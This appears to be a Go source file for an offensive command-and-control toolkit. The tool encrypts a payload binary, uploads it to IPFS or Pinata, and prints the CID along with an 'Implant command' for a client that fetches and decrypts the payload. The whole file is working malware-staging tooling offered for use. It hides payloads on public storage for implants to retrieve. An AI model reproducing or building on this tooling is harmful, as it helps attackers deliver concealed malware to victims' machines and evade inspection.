// Command upload encrypts a binary, uploads it to IPFS, and prints the CID.
//
// Usage:
//
//	./upload -key <32-byte-hex-key> -file payload.bin
//	./upload -key <key> -file payload.bin -ipfs-api http://localhost:5001/api/v0
//	./upload -key <key> -file payload.bin -pinata-jwt <jwt>
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/churchofmalware/c2-ipfs-payload/pkg/crypto"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/ipfs"
)

func main() {
	var (
		keyHex    = flag.String("key", "", "Encryption key (32-byte hex)")
		filePath  = flag.String("file", "", "Payload file to encrypt and upload")
		ipfsAPI   = flag.String("ipfs-api", "http://127.0.0.1:5001/api/v0", "IPFS API URL")
		pinataJWT = flag.String("pinata-jwt", "", "Pinata.cloud JWT (alternative upload)")
		noUpload  = flag.Bool("no-upload", false, "Only encrypt locally, skip IPFS")
		output    = flag.String("output", "", "Output file (default: <file>.enc)")
	)
	flag.Parse()

	if *keyHex == "" {
		log.Fatal("--key is required (32-byte hex key)")
	}
	if *filePath == "" {
		log.Fatal("--file is required")
	}

	data, err := os.ReadFile(*filePath)
	if err != nil {
		log.Fatalf("Failed to read payload file: %v", err)
	}

	key, err := crypto.HexToKey(*keyHex)
	if err != nil {
		log.Fatalf("Invalid key: %v", err)
	}

	encrypted, err := crypto.Encrypt(data, key)
	if err != nil {
		log.Fatalf("Encryption failed: %v", err)
	}

	outFile := *output
	if outFile == "" {
		base := filepath.Base(*filePath)
		outFile = base + ".enc"
	}

	if err := os.WriteFile(outFile, encrypted, 0644); err != nil {
		log.Fatalf("Failed to write encrypted file: %v", err)
	}
	fmt.Printf("✅ Encrypted payload saved: %s (%d bytes)\n", outFile, len(encrypted))

	if *noUpload {
		fmt.Println("Skipping IPFS upload (-no-upload flag)")
		fmt.Println("\nManual steps:")
		fmt.Println("  1. ipfs add", outFile)
		fmt.Println("  2. Use the CID: cid <cid>")
		return
	}

	client := ipfs.NewClient(*ipfsAPI, *pinataJWT)
	resp, err := client.Upload(encrypted, filepath.Base(outFile))
	if err != nil {
		log.Fatalf("IPFS upload failed: %v\n", err)
	}

	fmt.Printf("✅ Uploaded to IPFS!\n")
	fmt.Printf("   CID: %s\n", resp.CID)
	fmt.Printf("   Size: %d bytes\n", len(encrypted))
	fmt.Println("\nNext steps:")
	fmt.Println("  1. On the server console, run: cid", resp.CID)
	fmt.Println("  2. Or deploy directly: deploy", *filePath)
	fmt.Println("\nImplant command:")
	fmt.Printf("   ./client --cid-source <hub-url> --decryption-key %s\n", *keyHex)
}
